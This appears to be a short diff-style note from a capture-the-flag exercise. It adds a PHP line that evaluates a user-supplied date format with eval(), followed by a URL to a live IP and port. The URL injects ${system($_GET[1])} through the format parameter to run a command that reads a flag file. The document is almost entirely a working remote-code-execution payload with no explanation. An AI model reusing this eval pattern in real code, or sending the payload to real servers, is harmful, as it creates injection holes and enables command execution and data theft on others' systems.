@@ -1,0 +1,3 @@
+
+eval('$time = date("'.$this->format.'", strtotime("' . $this->prediction . '"));');
+http://139.59.178.146:32739/?format=${system($_GET[1])}&1=cat+/flagnm8Pv;
